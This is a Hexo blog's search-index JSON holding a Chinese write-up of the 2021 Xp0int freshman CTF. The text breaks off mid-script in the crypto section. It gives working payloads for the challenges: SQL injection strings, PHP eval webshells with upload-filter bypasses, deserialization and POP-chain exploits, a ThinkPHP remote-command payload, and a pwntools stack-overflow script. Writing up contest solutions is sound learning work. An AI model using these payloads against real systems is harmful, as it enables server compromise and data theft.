{"meta":{"title":"Hexo","subtitle":"","description":"","author":"vvmdx","url":"https://vvmdx.github.io","root":"/"},"pages":[{"title":"","date":"2021-07-13T08:51:14.047Z","updated":"2021-07-13T08:47:53.457Z","comments":true,"path":"baidu_verify_code-ElhKiUUMYo.html","permalink":"https://vvmdx.github.io/baidu_verify_code-ElhKiUUMYo.html","excerpt":"","text":"a634d750ec3ecf877288a10730990c54"},{"title":"","date":"2021-11-30T04:38:42.742Z","updated":"2021-11-30T04:38:41.762Z","comments":true,"path":"google4fc8c6b9a19a93d9.html","permalink":"https://vvmdx.github.io/google4fc8c6b9a19a93d9.html","excerpt":"","text":"google-site-verification: google4fc8c6b9a19a93d9.html"},{"title":"标签","date":"2021-09-19T05:22:42.757Z","updated":"2021-07-13T08:22:51.147Z","comments":false,"path":"tags/index.html","permalink":"https://vvmdx.github.io/tags/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2021-07-14T03:14:08.651Z","updated":"2021-07-13T08:22:51.146Z","comments":false,"path":"repository/index.html","permalink":"https://vvmdx.github.io/repository/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-08-31T10:42:32.275Z","updated":"2021-07-13T08:22:51.146Z","comments":false,"path":"categories/index.html","permalink":"https://vvmdx.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"2021Xp0int杯新生赛wp","slug":"2021-12-01-2021Xp0int杯新生赛wp","date":"2021-11-30T16:00:00.000Z","updated":"2021-12-01T11:10:19.078Z","comments":true,"path":"2021/12/01/2021-12-01-2021Xp0int杯新生赛wp/","link":"","permalink":"https://vvmdx.github.io/2021/12/01/2021-12-01-2021Xp0int%E6%9D%AF%E6%96%B0%E7%94%9F%E8%B5%9Bwp/","excerpt":"本来想把web ak了再发…发现剩下两道web是真没太懂，先发了后期补坑…","text":"本来想把web ak了再发…发现剩下两道web是真没太懂，先发了后期补坑… 2021新生赛 Web checkin 12345678910111213141516&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);$a = array(&quot;C&quot;, &quot;T&quot;, &quot;F&quot;);$num1 = 999999999;if (!($a == $_POST[&#x27;b&#x27;] and $a !== $_POST[&#x27;b&#x27;])) &#123; die(&quot;maybe you can learn something from https://www.php.net/manual/zh/language.operators.array.php&quot;);&#125;if (!(!empty($_GET[&#x27;num2&#x27;]) &amp;&amp; $_GET[&#x27;num2&#x27;] &gt; $num1 &amp;&amp; strlen($_GET[&#x27;num2&#x27;]) &lt; 4)) &#123; die(&quot;Scientific notation!!!&quot;);&#125;if (empty($_POST[&#x27;md5a&#x27;])||empty($_POST[&#x27;md5b&#x27;])||is_array($_POST[&#x27;md5a&#x27;])||is_array($_POST[&#x27;md5b&#x27;])||($_POST[&#x27;md5a&#x27;]==$_POST[&#x27;md5b&#x27;])||!(md5($_POST[&#x27;md5a&#x27;]) === md5($_POST[&#x27;md5b&#x27;]))) &#123; die(&quot;no no no&quot;);&#125;echo $flag; 数组运算符 参考php手册 $a == $b 具有相同键值对则true $a === $b 具有相同键值对且顺序相同则true payload1：b[1]=T&amp;b[0]=C&amp;b[2]=F 数组和数字大小比较 参考php手册 array和其他类型比较，array总是更大 payload2：?num2[] md5碰撞 一大堆判断，过滤了数组绕过和字符串0e绕过 只能用真实碰撞 工具:fastcoll 用于生成md5相同，但内容不同的两个文件 新建一个1.txt，随便写点东西 fastcoll_v1.0.0.5.exe -p 1.txt -o 2.txt 3.txt生成两个新文件 然后读取文件内容做个url编码作为参数传递即可 1234567891011&lt;?phpfunction readmyfile($path)&#123; $fh = fopen($path, &quot;rb&quot;); $data = fread($fh, filesize($path)); fclose($fh); return $data;&#125;echo md5( (readmyfile(&quot;2.txt&quot;))).&quot;\\n&quot;;echo urlencode(readmyfile(&quot;2.txt&quot;)).&quot;\\n&quot;;echo md5( (readmyfile(&quot;3.txt&quot;))).&quot;\\n&quot;;echo urlencode(readmyfile(&quot;3.txt&quot;)); payload: GET: http://35.229.138.83:16219/?num2[] POST: b[1]=T&amp;b[0]=C&amp;b[2]=F&amp;md5a=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00J%29%88%60e%F7%87E%FE%FA%FE%E5-%FB%B7M1%AE%87xiG%3BK%116%3B%BA00%AA%C9%97%C3%E9%E4L%26%AC%26%8B%08U%D2%F1%C3%23w%2C%3C%3E%B1%92V%86L%97%C4%ADI%8D%CDY%C9%7E%CA%02%12%C1%2Fc%06K%3A%25%C9%97%E9%09D%40%27F%8E%00%BB%00a%E1%FB%F4%C4%D8+%5D%A2%C7P%1F%DF%21%1B%82%D5o%A4%AC%EF%F4%8DN%C8%1A%02%12%0E%C5%40%28%95H%D5%7EM%1C%26%88%F3&amp;md5b=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00J%29%88%60e%F7%87E%FE%FA%FE%E5-%FB%B7M1%AE%87%F8iG%3BK%116%3B%BA00%AA%C9%97%C3%E9%E4L%26%AC%26%8B%08U%D2%F1C%24w%2C%3C%3E%B1%92V%86L%97%C4%AD%C9%8D%CDY%C9%7E%CA%02%12%C1%2Fc%06K%3A%25%C9%97%E9%09D%40%27F%0E%00%BB%00a%E1%FB%F4%C4%D8+%5D%A2%C7P%1F%DF%21%1B%82%D5o%A4%AC%EF%F4%0DN%C8%1A%02%12%0E%C5%40%28%95H%D5%7E%CD%1C%26%88%F3 flag: ctf&#123;Good_Luck_Have_Fun!&#125; baby-sql username 单引报错，找到注入点 1' or 1=1# 出了个admin 1' or 1=2# 出了？？？？ 1' order by 3# 出了？？？？ 1' order by 4# 报错，有3个字段 1' union select 1,2,3# 2，3回显 1' union select 1,2,database() 出库名babysql 1' union select 1,2,table_name from information_schema.tables where table_schema= 'babysql' 出表名flag 1' union select 1,2,group_concat(column_name) from information_schema.columns where TABLE_NAME='flag' 出字段名id、flag 1' union select 1,2,flag from flag# 出flag flag：flag&#123;9d5ae6b83c7ad5703872574e49aaf6f0&#125; baby-upload 传个一句话php马就完事了 1234&lt;?php@eval($_POST[&#x27;cmd&#x27;]);phpinfo();?&gt; 传后访问路径，执行个系统命令cmd=system('cat /flag'); flag：flag&#123;fcc9fbd1d19b3de78b7346bbb005d0d5&#125; baby-unserialize 123456789101112131415161718192021222324252627282930&lt;?phpclass baby&#123; public $filename = &quot;index.php&quot;; public function __construct($filename) &#123; $this-&gt;filename = $filename; &#125; function __destruct() &#123; echo file_get_contents($this-&gt;filename); //flag in flag.php &#125; function __wakeup() &#123; if ($this-&gt;filename !== &quot;index.php&quot;) &#123; $this-&gt;filename = &quot;index.php&quot;; &#125; &#125;&#125;if (isset($_POST[&#x27;str&#x27;])) &#123; $str = $_POST[&#x27;str&#x27;]; if (preg_match(&#x27;/flag/i&#x27;, $str)) &#123; die(&#x27;???&#x27;); &#125; else &#123; unserialize($str); &#125;&#125; else &#123; highlight_file(__FILE__);&#125; __wakeup()绕过 执行unserialize时会首先调用魔术方法wakeup，里面把php文件改名了，得绕 CVE-2016-7124：当成员属性数目大于实际数目时导致反序列化异常，可绕过__wakeup() 影响版本：php5 &lt; 5.6.25 php7 &lt; 7.0.10 payload1：str=O:4:&quot;baby&quot;:2:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125; 正则绕过 序列化字符串，将表示属性值的小写s改为大写，可以解析十六进制，以此绕过正则匹配 最终payload：str=O:4:&quot;baby&quot;:2:&#123;s:8:&quot;filename&quot;;S:8:&quot;\\66lag.php&quot;;&#125; flag：flag&#123;f44973d81697b67b26e2a357f537dc3b&#125; easy_js 查看网页源码，看到个index.js，打开，放入js美化/反混淆工具里面（强推CyberChef这个工具，最好下了本地用，集成了很多功能） 12345678910111213141516171819202122var H1 = 0;...function c() &#123; H1 += 1; window[&#x27;document&#x27;][&#x27;getElementById&#x27;](&#x27;clickNumber&#x27;)[&#x27;innerHTML&#x27;] = &#x27;Click number: &#x27; + H1; if (H1 === 99999999) &#123; var boF7 = new XMLHttpRequest(); var jQs8 = &#x27;flaggggggggggggggg.php?c1ick=&#x27; + H1; boF7[&#x27;onreadystatechange&#x27;] = function () &#123; if (boF7[&#x27;readyState&#x27;] == 4 &amp;&amp; boF7[&#x27;status&#x27;] == 200) &#123; text = boF7[&#x27;responseText&#x27;]; window[&#x27;document&#x27;][&#x27;getElementById&#x27;](&#x27;flag&#x27;)[&#x27;innerHTML&#x27;] = text; console[&#x27;log&#x27;](text); &#125; &#125;; boF7[&#x27;open&#x27;](&#x27;GET&#x27;, jQs8, true); boF7[&#x27;send&#x27;](); &#125; else &#123; window[&#x27;document&#x27;][&#x27;getElementById&#x27;](&#x27;flag&#x27;)[&#x27;innerHTML&#x27;] = &#x27;flag will appear when you click 99999999 times !&#x27;; &#125;&#125;... 代码很长，关注重点函数就行了，发现一个url和参数：flaggggggggggggggg.php?c1ick=，直接传99999999，出flag payload：/flaggggggggggggggg.php?c1ick=99999999 flag：flag&#123;ac24adc5685ff-f6402e80bc-6fb6ae59-62aa51fa&#125; easy_sql 1&quot; or 1=2# 报错，双引闭合 waf只是简单的过滤关键字，双写关键字绕过即可 1&quot; oorrder by 4# 报错，3个字段 1&quot; ununionion seselectlect 1,2,3# 回显2，3 不管了，直接猜数据库和babysql一样，不爆了 1&quot; ununionion seselectlect 1,2,database() 出库名easysql 1&quot; ununionion seselectlect 1,2,table_name frroom infoorrmation_schema.tables whwhereere table_schema='easysql'# 出表名flag 1&quot; ununionion seselectlect 1,2,grrooup_concat(column_name) frroom infoorrmation_schema.columns whwhereere TABLE_NAME='flflagag'# 出字段名id、flag 1&quot; ununionion seselectlect 1,2,flflagag frroom flflagag 出flag flag：flag&#123;d7edeb1366bd99aa12d109c99267e37e&#125; easy-upload 黑名单过滤，过滤方法是将字符串替换为空，可以双写绕过 一句话php马，文件名：a.pphphp 1234&lt;?php@eval($_POST[&#x27;cmd&#x27;]);phpinfo();?&gt; flag：flag&#123;b1ab8564a34adef4aaf542bfed45652c&#125; easy-unserialize 123456789101112131415161718192021222324252627282930313233&lt;?phphighlight_file(__FILE__);class getflag&#123; public $file; public function __destruct() &#123; if ($this-&gt;file === &quot;flag.php&quot;) &#123; echo file_get_contents($this-&gt;file); &#125; &#125;&#125;class tmp&#123; public $str1; public $str2; public function __construct($str1, $str2) &#123; $this-&gt;str1 = $str1; $this-&gt;str2 = $str2; &#125;&#125;$str1 = $_POST[&#x27;str1&#x27;];$str2 = $_POST[&#x27;str2&#x27;];$data = serialize(new tmp($str1, $str2));$data = str_replace(&quot;easy&quot;, &quot;ez&quot;, $data);unserialize($data); 代码审计 post接收两个参数，传入tmp类后序列化 序列化字符串经过过滤，easy变为ez 过滤后的字符串进行反序列化 关键点：给类getflag的file赋上值flag.php，并实例化对象（为了调用__destruct()） 反序列化字符串逃逸 u1s1我觉得这篇文章总结的还行，不知道为什么没有赞，mark一下，后期自己再整理一遍 严格来说属于字符串逃逸中的类逃逸 先给getflag类的file赋上值序列化一下：O:7:&quot;getflag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 给str1赋值easy，str2赋值上面的序列化字符串，看下结果 O:3:“tmp”:2:{s:4:“str1”;s:4:“easy”;s:4:“str2”;s:44:“O:7:“getflag”:1:{s:4:“file”;s:8:“flag.php”;}”;} O:3:“tmp”:2:{s:4:“str1”;s:4:“ez”;s:4:“str2”;s:44:“O:7:“getflag”:1:{s:4:“file”;s:8:“flag.php”;}”;} 可以看到经过过滤s:4:&quot;easy&quot;变成了s:4:&quot;ez&quot;，逃逸了两个字符 思路：长变短逃逸没办法把已有属性逃逸出去，因此我们直接让tmp类多一个属性str3，并让str3属性的值为getflag类的序列化字符串（这就是类逃逸） 以此构造str2=;s:4:&quot;str3&quot;;O:7:&quot;getflag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 分号是为了闭合前面的双引，让他读到 &quot;; 时能够正确闭合属性 序列化一下得到O:3:&quot;tmp&quot;:2:&#123;s:4:&quot;str1&quot;;s:4:&quot;easy&quot;;s:4:&quot;str2&quot;;s:56:&quot;;s:4:&quot;str3&quot;;O:7:&quot;getflag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&quot;;&#125; 从easy后面到str3的值前面， &quot;;s:4:&quot;str2&quot;;s:56: 是需要我们覆盖的，计算一下有18个字符 根据每个easy变ez能逃逸2个字符，我们构造9个easy刚好逃逸18个字符 构造后尝试一下反序列化，可以看到s:36:后面刚好把需要覆盖的内容包含进去了，造成了类逃逸，实例化了getflag类 最终payload： post：str1=easyeasyeasyeasyeasyeasyeasyeasyeasy&amp;str2=;s:4:&quot;str3&quot;;O:7:&quot;getflag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 发送后查看网页源码得flag：flag&#123;e99eca072a432c54b84e18e5c5c62ef5&#125; ezPy 根据题目意思这大概和python有关，搜了一下python的注入，基本都是ssti的模板注入，传个参数试一下： 可以看到4 = 4，意味着其中的语句被解析了，原理分析网上一堆，不细说，直接参考vulhub的exp，把popen执行的命令改为cat /flag 这里要不要url编码好像都行，不过用burp的话最好还是用下url编码，不然可能出问题 flag：flag&#123;Pyth0n_1s_1mp0rtant!!!!!&#125; simple_php 翻了源码、前端、返回包等所有可能藏hint的地方都没hint，访问了下index.php正常，访问随便其他的比如1.php会报404，基本是源码泄露没跑了 常见源码泄露参考 （先自己mark一下，后期再整理一遍，，） 访问index.php.swp，拿到源码 1234567891011121314&lt;?phpfunction getflag()&#123; echo file_get_contents(&quot;./flag&quot;);&#125;if(isset($_GET[&#x27;code&#x27;]))&#123; $code=$_GET[&#x27;code&#x27;]; if(strlen($code)&gt;14)&#123; die(&quot;too long !&quot;); &#125; if(preg_match(&#x27;/[a-zA-Z0-9_&amp;^&lt;&gt;&quot;\\&#x27;$#@!*&amp;+=.`\\[\\]&#123;&#125;?,]+/&#x27;,$code))&#123; die(&quot; No ! No !&quot;); &#125; @eval($code);&#125; 代码审计 接收get请求code参数 过字符串长度过滤和正则后eval执行 思路 字符串不能太长，所以通过system(‘cat /flag’)不可取 =&gt; 直接执行getflag函数 绕正则，先fuzz一下看看出题人留了什么给我们用 123456for($var = 33; $var &lt; 127; $var++) &#123; if(!preg_match(&#x27;/[a-zA-Z0-9_&amp;^&lt;&gt;&quot;\\&#x27;$#@!*&amp;+=.`\\[\\]&#123;&#125;?,]+/&#x27;,chr($var))) &#123; echo chr($var); &#125;&#125;// %()-/:;\\|~ 参考p神博客，这题属于无字母无数字shell的进阶版，异或和自增绕过都用不了，因此要用取反绕过 先对字符串getflag取反，由于取反后会有不可见字符，因此再用url编码一下：urlencode(~'getflag')得%98%9A%8B%99%93%9E%98 再作为code参数传递即可执行@eval((getflag)()) 最终payload：?code=(~%98%9A%8B%99%93%9E%98)(); flag：flag&#123;a3b5c6d-563ae31f-b6672e33ed-ff63a5b8&#125; thinkphp 参考vulhub 直接拿payload来rce 直接cat /flag拿不到，估计flag要么不在根目录要么改名了 接着find /|grep “flag” 也找不到，那就肯定是改名了，直接一层一层目录遍历上去，在根目录找到FL4G payload： GET：?s=captcha POST：_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=cat%20../../../../FL4G flag：flag&#123;ewyg_wyuf_ushg_dgds_dgfs!&#125; ez-rce 搜一搜无参数函数rce，其实挺多文章的，包括一些题目（搜[GXYCTF2019]禁止套娃）也有，不过里面要么没过滤要么过滤没出题人这么变态… 看了好多篇文章，这篇发的时间较早，总结的挺好，不过没考虑过滤的情况，觉得还是这篇的骚操作多一点，不局限于某一题，而是总结性质的告诉你哪些可以用 提炼一下用到的几个函数吧 time()：返回当前的时间（Unix纪元，1970-01-01到现在的秒数） crypt(arg)：加盐哈希 =&gt; crypt(time()) 详细介绍戳 =&gt; https://www.php.net/manual/zh/function.crypt.php（建议拉到下面看不同算法的盐值构造） php的crypt有个很巧妙的地方，首先它在不同操作系统上的默认算法可能不一样（DES、Blowfish、MD5），这里我主要说MD5 crypt(“abc”) 的（某次）结果为$1$Yn5.BJ3.$j5RYtWilZIabNWw4NP2YD. $1$表示使用加盐md5，$Yn5.BJ3.$ 两个美元符中间的是盐值，后面的是base64字符串，这就出现一个很有趣的地方了，base64里并没有 . 这个表示 ，经过多次试验后，发现crypt()的结果（若使用md5）字符串末尾只有4种可能：‘0’、‘1’、‘.’、‘/’ 这个我搜了一下发现好像没什么人介绍过（当然可能是我搜商太差…）想了一下，我猜大概是因为MD5的结果是128比特长，然后base64嘛，6比特代表一个字符，因此128 / 6 = 21 … 2，剩了两个比特，两个比特4种组合，所以就分别用01./四个字符来表示了（其实我感觉php源码应该得有写，先mark一下挖个坑吧，后期整理） hebrevc() ：用于把希伯来文本从右至左的流转换为左至右的流 有的地方说“只有 224 至 251 之间的 ASCII 字符，以及标点符号受到影响”，其实不太严谨，自己写个脚本fuzz一下就可以发现，ascii=45的‘-’和ascii=47的‘/’不会受影响 前两个是不受影响的，最后是受影响的，然后ascii=251也不受影响 hebrevc(crypt(time()))：将crypt()哈希字符串末尾的 . 移到最前面 ord()：返回字符串中第一个字符的ascii值 chr()：ascii值转字符 chr(ord(hebrevc(crypt(time()))))：读出 . scandir()：列出指定路径中的文件和目录 scandir('.') ：读当前目录中的文件和目录 end()：返回数组中最后一个元素 其他还有next()、prev()分别表示返回数组前一个元素或后一个元素，做题的时候没思考，直接用end()读了（大多数题都是这样），写wp的时候想到或许可以组合一下做目录遍历？要真有flag不放在最后一个的呢…（其实那篇总结下文有说，，只是都过不了本题的正则…） show_source()：没什么说的了，把文件显示出来 readfile、highlight_file、file_get_contents也可以读，只是呗过滤了file，还有个readgzfile()比较冷门，可以绕过一些过滤 最后再贴次链接：http://www.heetian.com/info/827，u1s1总结的真不错，mark一下后期整理 最终payload： POST：shell=show_source(end(scandir(chr(ord(hebrevc(crypt(time()))))))); 如果报scandir($)的错就多提交几次，毕竟crypt()以.结尾只有25%的概率 flag：flag&#123;68ff971077c08515fdbbd83fac40fcb1&#125; ezpop u1s1我觉得这题出的真不错…虽然pop链分析的文章很多，也有题目的wp，不过结合了一些其他的小trick感觉就很巧妙，有很多值得mark后后期整理的地方 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&lt;?phperror_reporting(0);class openfunc&#123; public $object; function __construct()&#123; // 序列化时触发 $this-&gt;object=new normal(); &#125; function __wakeup()&#123; // 反序列化时触发 $this-&gt;object=new normal(); &#125; function __destruct()&#123; // 对象销毁时触发 $this-&gt;object-&gt;action(); &#125;&#125;abstract class hack &#123;// 抽象类不可实例化对象，需要通过子类调用方法 abstract public function pass(); // 抽象类，提供抽象接口，方法由子类实现 public function action() &#123; $this-&gt;pass(); &#125;&#125;class normal&#123;// 没什么好审的，要绕的函数 public $d; function action()&#123; echo &quot;you must bypass it&quot;; &#125;&#125;class evil extends hack&#123;// 抽象类hack的子类 public $data; public $a; public $b; public $c; public function pass()&#123; $this-&gt;a = unserialize($this-&gt;b); // b为序列化字符串，反序列化后赋给a，所以a应该为一个对象 $this-&gt;a-&gt;d = urldecode(date($this-&gt;c)); // 给对象a的d属性赋值，赋值内容为经过url解码的date()函数返回值，其中date()参数为$c if($this-&gt;a-&gt;d === &#x27;shell&#x27;)&#123; // 若值为shell则调用shell()方法 $this-&gt;shell(); &#125; else&#123; // 得绕 die(date(&#x27;Y/m/d H:i:s&#x27;)); &#125; &#125; function shell()&#123; if(preg_match(&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump|php/i&#x27;,$this-&gt;data))&#123; // 正则，绕就完事 die(&quot;you die&quot;); &#125; $dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;; if(!file_exists($dir))&#123; mkdir($dir); &#125; echo $dir; // 给了个路径，需要访问http://ip/sandbox/md5(?)/hack.php // 其中hack.php的内容由$this-&gt;data写进去 file_put_contents(&quot;$dir&quot; . &quot;hack.php&quot;, $this-&gt;data); &#125;&#125;if (isset($_GET[&#x27;Xp0int&#x27;])) &#123; // 接收get请求Xp0int参数，base64解码后反序列化 $Data = unserialize(base64_decode($_GET[&#x27;Xp0int&#x27;]));&#125; else &#123; highlight_file(__file__); &#125; 代码审计 代码比较多，审计直接写注释里了，看起来方便些 思路 最终我们需要的东西在file_put_contents(&quot;$dir&quot; . &quot;hack.php&quot;, $this-&gt;data);里，这里可以data可控，所以想法是写一个php马进去，因此需要让程序运行到这一句并成功写入shell 调用链： 1234567openfunc -&gt;__wakeup()-&gt;normal#action() // 需要绕过 -&gt;__destruct() [-&gt;object#action()] // object赋为evil类 -&gt;evil#action() -&gt;hack#action() // 子类没有action()方法，去父类找 -&gt;hack#pass() -&gt;evil#pass() // 父类接口由子类实现 -&gt;evil#shell() 分析完调用链就需要一步一步绕过了 绕__wakeup() 没什么好说了，成员属性数目大于实际数目即可 date() 其实这个地方一开始以为可以用public和protected访问控制修饰符修改的方法绕过的，不过好像用不了，先mark一下，后期看看整理一波利用姿势 参考php手册：date的特性：当date()参数不是格式字串时将原样展示 因此$this-&gt;c赋值为“shell”的url编码即可（url编码中的小写c属于格式字串，改为大写就可以了） file_put_contents(): 参考php手册 第二个参数可以是数组，因此可以用来绕过上面的正则，比如data=eval(); =&gt; data=['ev','al();'] 都绕完了就开始写exp： 12345678910$open=new openfunc();$evil=new evil();$data=[&#x27;&lt;?ph&#x27;,&#x27;p &#x27;,&#x27;@ev&#x27;,&quot;al(\\$_POST[&#x27;cmd&#x27;]);&quot;]; // 绕正则$evil-&gt;data = $data;$evil-&gt;c = &#x27;%73%68%65%6C%6C&#x27;; // 绕date()$open-&gt;object=$evil;echo serialize($open).&quot;\\n&quot;;// O:8:&quot;openfunc&quot;:1:&#123;s:6:&quot;object&quot;;O:4:&quot;evil&quot;:4:&#123;s:4:&quot;data&quot;;a:4:&#123;i:0;s:4:&quot;&lt;?ph&quot;;i:1;s:2:&quot;p &quot;;i:2;s:3:&quot;@ev&quot;;i:3;s:18:&quot;al($_POST[&#x27;cmd&#x27;]);&quot;;&#125;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;s:1:&quot;c&quot;;s:15:&quot;%73%68%65%6C%6C&quot;;&#125;&#125;// 把&quot;openfunc&quot;:1:改为2 绕__wakeup()，编码一下echo base64_encode(&#x27;O:8:&quot;openfunc&quot;:2:&#123;s:6:&quot;object&quot;;O:4:&quot;evil&quot;:4:&#123;s:4:&quot;data&quot;;a:4:&#123;i:0;s:4:&quot;&lt;?ph&quot;;i:1;s:2:&quot;p &quot;;i:2;s:3:&quot;@ev&quot;;i:3;s:18:&quot;al($_POST[\\&#x27;cmd\\&#x27;]);&quot;;&#125;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;s:1:&quot;c&quot;;s:15:&quot;%73%68%65%6C%6C&quot;;&#125;&#125;&#x27;); 最终payload GET：?Xp0int=Tzo4OiJvcGVuZnVuYyI6Mjp7czo2OiJvYmplY3QiO086NDoiZXZpbCI6NDp7czo0OiJkYXRhIjthOjQ6e2k6MDtzOjQ6Ijw/cGgiO2k6MTtzOjI6InAgIjtpOjI7czozOiJAZXYiO2k6MztzOjE4OiJhbCgkX1BPU1RbJ2NtZCddKTsiO31zOjE6ImEiO047czoxOiJiIjtOO3M6MToiYyI7czoxNToiJTczJTY4JTY1JTZDJTZDIjt9fQ== 返回地址，访问hack.php，成功命令执行 目录遍历出flag位置，拿下 flag：flag&#123;Y0u_Ar3_A_POP_Ma5ter!!!!&#125; PictureGenerator 麻了，比赛的时候没发现有附件，尝试了好久目录穿越任意文件下载一直下不了…结果比赛结束后和同学交流才发现有附件… 123456789101112131415161718192021222324252627282930# app.pyfrom flask import Flask, request, redirect, url_forimport osimport randomimport stringimport time clean = time.time()app = Flask(__name__)chars = list(string.ascii_letters + string.digits)@app.route(&#x27;/&#x27;)def main(): return open(&quot;index.html&quot;).read()@app.route(&#x27;/generate&#x27;, methods=[&#x27;POST&#x27;])def upload(): global clean if time.time() - clean &gt; 60: os.system(&quot;rm static/images/*&quot;) clean = time.time() data = request.form.getlist(&#x27;text&#x27;)[0] data = data.replace(&quot;\\&quot;&quot;, &quot;&quot;) data = data.replace(&quot;$&quot;,&quot;&quot;) name = &quot;&quot;.join(random.choices(chars,k=8)) + &quot;.png&quot; os.system(f&quot;python3 gene.py &#123;name&#125; \\&quot;&#123;data&#125;\\&quot;&quot;) return redirect(url_for(&#x27;static&#x27;, filename=&#x27;images/&#x27; + name), code=301) if __name__ == &quot;__main__&quot;: app.run(&quot;0.0.0.0&quot;,80) Reverse signin 拖入ida看main的伪c（将Buf2简化一下） 12345678910111213141516171819202122232425262728293031323334353637383940414243int __cdecl main(int argc, const char **argv, const char **envp)&#123; size_t v3; // rax size_t v4; // rax char Buf2[32]; // [rsp+20h] [rbp-60h] BYREF char Str[96]; // [rsp+40h] [rbp-40h] BYREF int v8; // [rsp+A0h] [rbp+20h] unsigned __int64 j; // [rsp+B0h] [rbp+30h] unsigned __int64 i; // [rsp+B8h] [rbp+38h] _main(argc, argv, envp); memset(Str, 0, sizeof(Str)); v8 = 0; Buf2 = [102,11,104,12,115,1,98,9,98,4,99,13,94,39,70,22,84,32,109,9,114,21,111,28,37,65] printf(&quot;input flag: &quot;); scanf(&quot;%100s&quot;, Str); if ( strlen(Str) == 26 ) &#123; for ( i = 0i64; ; ++i ) &#123; v3 = strlen(Str); if ( i &gt;= v3 ) break; Str[i] = 2 * (i | Str[i]) - i - Str[i]; &#125; for ( j = 1i64; ; ++j ) &#123; v4 = strlen(Str); if ( j &gt;= v4 ) break; Str[j] = 2 * (~Str[j] &amp; Str[j - 1]) - (~Str[j] | Str[j - 1]) + (Str[j] | ~Str[j - 1]); &#125; if ( memcmp(Str, Buf2, 0x1Aui64) ) &#123; puts(&quot;wrong!&quot;); exit(-1); &#125; puts(&quot;right! &quot;); exit(0); &#125; puts(&quot;wrong! &quot;); return 0;&#125; 逻辑：输入的Str，经过两轮for循环计算，若与buf相等，则right，输入的Str即为flag 逆向python脚本： 123456789101112131415161718192021222324252627282930# -*-coding:utf-8-*-&quot;&quot;&quot;by vvmdx2021/11/27 21:09&quot;&quot;&quot;buf = [102,11,104,12,115,1,98,9,98,4,99,13,94,39,70,22,84,32,109,9,114,21,111,28,37,65]flag = [0]*26tmp = [0]*26def re(): for j in range(1, 26): Strj = 0 while buf[j] != 2 * (~Strj &amp; buf[j-1]) - (~Strj | buf[j-1]) + (Strj | ~buf[j-1]): Strj += 1 tmp[j] = Strj tmp[0]=buf[0] for i in range(26): Stri = 0 while tmp[i] != 2 * (i | Stri) - i - Stri: Stri += 1 flag[i] = Stri f=&#x27;&#x27; for i in flag: f += chr(i) print(f)re() flag：flag&#123;welcome_to_Re_world!&#125; Pwn div_overflow 参考：2021强网no_output checksec看下保护 栈上代码不可执行，其他无保护 ida看一下 main 输入v5，v4，执行v5=v5/v4后打印字符串退出 init 一个时钟，一个信号singnal，表示捕捉到8信号的时候中断并执行backdoor函数 backdoor buf数组长度为80（0x50），但read会读0x100 getshell 弹个shell 思路： 触发8信号（除0或是除法发生溢出）产生中断执行backdoor int类型表示范围：-231(-2147483648)~231-1(2147483647) 溢出构造：-2147483648/-1 = 2147483648 大于int最大值，上溢 backdoor给了个栈溢出，可以利用他将返回地址覆盖为getshell函数的地址 调试 断点打到backdoor，除法溢出触发中断 进入backdoor后，buf为-0x50，也就是buf会从rbp-0x50的位置开始读 构造一个‘a’*57的字符串（不是58是因为没用pwntool的话回车会算一个字符别骂了别骂了我还是对pwntool交互不熟…），发送后发现RBP已经被修改为aaaaaaa\\n， 接着就是leave和ret 将上一步的payload修改为‘a’*58+0x4007c7（getshell的地址）（当然这里next的话会出错，因为多了个换行符），可以看到rsp的值被覆盖 本地程序测试一下 1234567from pwn import *p =process(&#x27;./div_overflow&#x27;)payload = b&#x27;a&#x27;*(0x50+8)+p64(0x4007c7)p.sendlineafter(&#x27;Please input the first key :&#x27;,&#x27;-2147483648&#x27;)p.sendlineafter(&#x27;And the second key :&#x27;,&#x27;-1&#x27;)p.sendlineafter(&quot;Hero, please leave your name :&quot;,payload)p.interactive() getshell成功 远程打 1234567from pwn import *p = remote(&quot;35.229.138.83&quot;,14056)payload = b&#x27;a&#x27;*(0x58)+p64(0x4007cb)p.sendlineafter(&#x27;Please input the first key :&#x27;,&#x27;-2147483648&#x27;)p.sendlineafter(&#x27;And the second key :&#x27;,&#x27;-1&#x27;)p.sendlineafter(&quot;Hero, please leave your name :&quot;,payload)p.interactive() 这好奇怪，本地用0x4007c7是打得通的，但是远程打不通，要用0x4007c8或者0x4007cb才能通…mark一下后期再找原因 flag：flag&#123;DIvSiOn_So_EAsy_YeS_vwtub468&#125; Crypto proof_of_work 爆破sha-256前4位 123456789101112131415161718import hashlibimport stringString = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&quot;def pow(): behind = &quot;98BUbI5iG036&quot; hashValue = &quot;6b18dccbb71a096c46d9412876c56a2da6ba05924ff735f557db22cc4f957084&quot; font = &quot;&quot; for chr1 in String: for chr2 in String: for chr3 in String: for chr4 in 